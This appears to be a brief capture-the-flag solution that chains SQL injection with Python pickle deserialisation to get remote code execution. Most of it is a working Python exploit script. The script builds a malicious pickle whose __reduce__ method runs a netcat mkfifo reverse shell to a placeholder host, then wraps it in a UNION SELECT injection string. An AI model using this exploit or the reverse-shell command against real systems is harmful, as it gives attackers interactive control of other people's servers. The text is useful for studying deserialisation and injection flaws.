# How to sol

## Step 1 - identify vuln
template_filer -> pickle -> deserialize in python

## Step 2 - exploit
 - i see it get directly value and dont sensitize -> `SQLI` -> inject payload -> pickle deserial it -> RCE


```python
# Demo Code
import os
import pickle
import base64
import requests

class Item:
	# def __init__(self, name, description, price, image):
	# 	self.name = name
	# 	self.description = description
	# 	self.image = image
	# 	self.price = price
	def __reduce__(self):
		cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <host> 1234 > /tmp/f')
		return os.system, (cmd,)

if __name__  == '__main__':
	payload = base64.b64encode(pickle.dumps(Item())).decode()
	payload = f"' UNION SELECT '{payload}' -- "
	payload = requests.utils.requote_uri(payload)
	print(payload)
```